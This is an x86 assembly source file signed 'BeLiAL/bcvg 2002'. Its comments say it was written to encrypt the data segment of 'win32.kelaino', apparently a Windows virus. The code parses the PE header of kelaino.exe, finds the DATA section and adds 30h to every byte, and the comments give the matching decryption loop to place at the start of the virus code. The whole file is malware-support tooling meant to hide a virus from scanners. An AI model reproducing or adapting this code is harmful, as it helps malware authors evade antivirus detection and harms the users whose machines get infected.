;Puts a simple 8-bit encryption over the data segment
;of a file (Name of this segment HAS to be DATA)
;Coded for an encryption of win32.kelaino, because it works
;as normal file and uses because of this his data segment.
;For decryption put this at the beginning of ur code:

;mov ecx,offset data_seg_end
;sub ecx,offset data_seg_start
;mov eax,offset data_seg_start

;decryption_loop:

;cmp ecx,0
;je start2
;sub byte ptr [eax],30h
;inc eax
;dec ecx
;jmp decryption_loop

;start2:

;BeLiAL/bcvg 2002

.386
.model flat

EXTRN ExitProcess:Proc
EXTRN CreateFileA:Proc
EXTRN GetFileSize:Proc
EXTRN CreateFileMappingA:Proc
EXTRN MapViewOfFile:Proc
EXTRN CloseHandle:Proc
EXTRN UnmapViewOfFile:Proc

.data

filename        db "kelaino.exe",0  
filehandle      dd 0
filemaphandle   dd 0
mapaddress      dd 0
filesize        dd 0
section           dw 0  
section_name      db "DATA"

.code

start:

call open_file

mov ebx,dword ptr [eax+3ch]
add ebx,dword ptr mapaddress
mov ax,word ptr [ebx]
cmp ax,'EP'
jne exit_here

xor ecx,ecx
mov cx,word ptr [ebx+6h]
mov word ptr [section],cx

xor eax,eax
mov ax,word ptr [ebx+14h]
mov edx,ebx
add edx,eax
add edx,18h  ;now we are in front of the section tables

find_data_section:
mov esi,offset section_name
mov edi,edx
mov ecx,4
rep cmpsb
je found_data_section
add edx,28h
dec word ptr [section]
cmp word ptr [section],0
je close_the_file
jmp find_data_section

found_data_section:

mov eax,dword ptr [edx+10h]
mov ebx,dword ptr [edx+14h]
add ebx,dword ptr [mapaddress]

encryption_loop:

cmp eax,0
je close_the_file
add byte ptr [ebx],30h
inc ebx
dec eax
jmp encryption_loop

close_the_file:

call close_file

exit_here:

push 0
call ExitProcess

;-----------------------------------------------------------procs-----------------------------------------

open_file proc

push 0
push 0
push 3
push 0
push 1
push 80000000h + 40000000h
push offset filename
call CreateFileA
cmp eax,0ffffffffh
jne make_the_map
pop eax
jmp exit_here

make_the_map:
mov dword ptr filehandle,eax
push 0
push dword ptr filehandle
Call GetFileSize

mov dword ptr [filesize],eax
mov ebx,eax

push 0
push ebx
push 0
push 4
push 0
push dword ptr filehandle
call CreateFileMappingA
mov dword ptr filemaphandle,eax

push ebx
push 0
push 0
push 2
push eax
call MapViewOfFile
mov dword ptr mapaddress,eax
ret 

endp

close_file proc

push dword ptr [mapaddress]
call UnmapViewOfFile

push dword ptr [filemaphandle]
call CloseHandle

push dword ptr [filehandle]
call CloseHandle

ret

endp


end start
